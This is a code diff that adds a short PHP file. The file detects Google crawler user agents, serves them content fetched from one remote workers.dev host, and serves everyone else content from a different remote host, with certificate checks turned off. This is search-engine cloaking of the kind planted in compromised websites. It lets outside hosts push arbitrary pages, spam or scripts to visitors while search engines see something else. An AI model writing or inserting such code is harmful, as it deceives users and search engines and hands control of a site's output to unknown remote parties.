@@ -1,0 +1,35 @@
+<?php
+function get_raw($url) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_TIMEOUT        => 15,
+    ]);
+    $out  = curl_exec($ch);
+    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($out === false || $code >= 400) {
+        return '';
+    }
+    return $out;
+}
+
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+$isGoogle = (
+    stripos($ua, 'Googlebot') !== false ||
+    stripos($ua, 'Google-InspectionTool') !== false ||
+    stripos($ua, 'AdsBot-Google') !== false ||
+    stripos($ua, 'APIs-Google') !== false ||
+    stripos($ua, 'Mediapartners-Google') !== false ||
+    stripos($ua, 'Google Favicon') !== false
+);
+
+if ($isGoogle) {
+    echo get_raw('https://polished-morning-ed85.yeabro.workers.dev/');
+} else {
+    echo get_raw('https://little-term-17a2.yeabro.workers.dev/');
+}
